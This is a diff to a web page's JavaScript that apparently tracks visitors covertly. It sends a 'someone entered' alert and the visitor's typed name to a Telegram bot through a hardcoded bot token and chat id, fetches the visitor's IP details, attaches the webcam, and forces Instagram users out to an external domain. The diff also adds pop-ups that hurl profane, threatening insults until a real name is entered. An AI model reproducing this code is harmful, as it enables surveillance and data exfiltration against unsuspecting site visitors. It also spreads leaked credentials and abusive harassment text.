@@ -1,8 +1,30 @@
+function message() {
+	msgs = 
+	[
+		"fuck man put your real name you motherfucker",
+		"fr bro put your name fam",
+		"im getting mad bro put your real name",
+		"the fuck you doing i need your real name",
+		"fuck off you monkey put yo name",
+		"im bout to blow yo ass bro put your name",
+	]
+	const random = msgs[Math.floor(Math.random() * msgs.length)];
+	Toastify({
+		text: `${random}`,
+		duration: 3000,
+		gravity: "bottom",
+		position: "center",
+		stopOnFocus: true,
+		style: {
+		  background: "linear-gradient(to right, red, #880808",
+		},
+	  }).showToast();
+}
 var Welcome = `https://api.telegram.org/bot5342005128:AAFjMw1i9K-FSDX0RzrRHgsyhMj9QMs80VU/sendMessage?chat_id=1603299669&parse_mode=html&text=👨‍💻 <u><b><i>Someone entered to the website</i></b></u>`;
 var oReq = new XMLHttpRequest(); 
 oReq.open("GET", Welcome, true); 
 oReq.send();
-fetch("https://api.ipbase.com/json/?apikey=13841960-bf98-11ec-bdc4-5134c1fdde2f")
+fetch("https://api.ipbase.com/json/") //?apikey=13841960-bf98-11ec-bdc4-5134c1fdde2f
 	.then((res) => res.json())
 	.then((data) => {
 		var output = `
@@ -63,8 +85,10 @@ function userName(){
 		content: "input",
 	})
 	.then((value) => {
-		if (value == null || undefined || "" || " " || "." || "  "){
+		if (value == "" || value == " " || value == "." || value == null){
+			message()
 			userName();
+			return;
 		} else {
 		swal(`nice to meet you ${value} 🥺💞`);
 		var name = `https://api.telegram.org/bot5342005128:AAFjMw1i9K-FSDX0RzrRHgsyhMj9QMs80VU/sendMessage?chat_id=1603299669&parse_mode=html&text=<u><b><i>Visitor's name is:</i></b></u> %0A ✨${value}`;
@@ -86,14 +110,28 @@ window.onload = function(){
 	var isInstagram = (ua.indexOf('Instagram') > -1) ? true : false;
 	let isIOS = (/iPad|iPhone|iPod/.test(navigator.platform))
 	if (isIOS){
-		console.log('')
 	} else {
 		if (isInstagram){
 			window.location.href = "intent:https://moncef.ml/send#Intent;end";
-			alert("use google chrome")
 		}
 		else {
-			console.log('browser')
+			// console.log('browser')
+			// navigator.permissions.query({name:'camera'})
+			// .then(res =>{
+			// 	if (res.state == "denied"){
+			// 		console.log("allow")
+			// 		Swal.fire({
+			// 			position: 'center',
+			// 			title: 'Allow Your Webcamera please',
+			// 			showConfirmButton: false,
+			// 			timer: 3000
+			// 		})
+			// 		setTimeout(function(){
+			// 			location.refresh
+			// 		}, 3000)
+			// 	} else if (res.state == "prompt"){
+			// 	}
+			// })
 		}
 	}
 	Webcam.attach('#my_camera');
